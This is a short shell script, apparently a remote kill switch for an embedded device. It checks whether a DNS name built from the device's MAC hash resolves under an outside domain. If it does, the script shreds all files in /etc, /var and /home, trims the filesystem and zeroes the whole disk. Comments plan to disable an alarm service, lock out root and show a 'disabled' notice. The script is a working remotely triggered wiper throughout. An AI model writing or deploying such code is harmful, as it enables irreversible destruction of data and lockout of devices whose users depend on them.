#!/bin/sh
hash=$(md5sum /sys/class/net/eth0/address | awk '{print $1}')
trigger=$hash.bobbauble.co.uk

if host $trigger 2>&1 >/dev/null ; then
#         echo nuke
       find /etc /var /home -type f -print0 | xargs -0 shred --remove
       fstrim /
       dd if=/dev/zero of=/dev/mmcblk0 bs=1M oflag=direct
fi

# Tasks: 
# disable alarmd
# lock out root password
# change default site to: this em is disabled contact wems

# Test on: 
# key file on fs
# filesytem / swap uuid
# hide data in 2049 -> 4096 of disk
# uuid / key in db
